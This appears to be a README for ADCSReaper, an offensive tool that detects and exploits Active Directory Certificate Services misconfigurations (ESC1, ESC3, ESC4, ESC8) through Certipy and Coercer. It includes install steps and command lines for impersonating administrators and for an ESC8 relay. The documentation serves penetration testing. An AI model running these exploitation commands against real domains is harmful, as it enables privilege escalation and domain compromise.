# ADCSReaper
A modular tool for enumerating and exploiting misconfigurations in Active Directory Certificate Services (ADCS).


```
 ▄▄▄      ▓█████▄  ▄████▄    ██████  ██▀███  ▓█████ ▄▄▄       ██▓███  ▓█████  ██▀███
▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒ ▓██ ▒ ██▒▓█   ▀▒████▄    ▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄
 ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒░██▓ ▒██▒░▒████▒▓█   ▓██▒▒██▒ ░  ░░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░   ▒    ░ ░  ░ ░        ░  ░  ░    ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░
      ░  ░   ░    ░ ░            ░     ░        ░  ░     ░  ░            ░  ░   ░
           ░      ░

```

## Features

- 🔍 Automated discovery of vulnerable certificate templates (ESC1, ESC3, ESC4, ESC8)
- 💣 Exploitation automation via Certipy & Coercer
- ✅ Safety checks to avoid unintended behavior
- 🔐 PFX file validation
- 📄 Structured logging with log rotation
- 🔧 Easily extensible architecture

## Requirements

- Python 3.8+
- Tools (installed & in $PATH):
  - [Certipy](https://github.com/ly4k/Certipy)
  - [Coercer](https://github.com/p0dalirius/Coercer)

```bash
# Certipy
pipx install git+https://github.com/ly4k/Certipy.git

# Coercer
sudo python3 -m pip install coercer
```

## Quickstart / Setup

```bash
pipx install git+https://github.com/G0urmetD/ADCSReaper.git
adcsreaper -h
```

## Usage
### Detection Only
```bash
adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -detect
```

### Exploit ESC1
```bash
# default Administrator
adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc1

# custom target user
adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc1 -target-user Admin2
```

### Exploit ESC3
```bash
adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc3
```

### Exploit ESC4
```bash
adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc4
```

### Exploit ESC8
```bash
adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc8 -lhost 192.168.1.5
```

## Logging
- /var/log/adcsreaper/adcsreaper.log
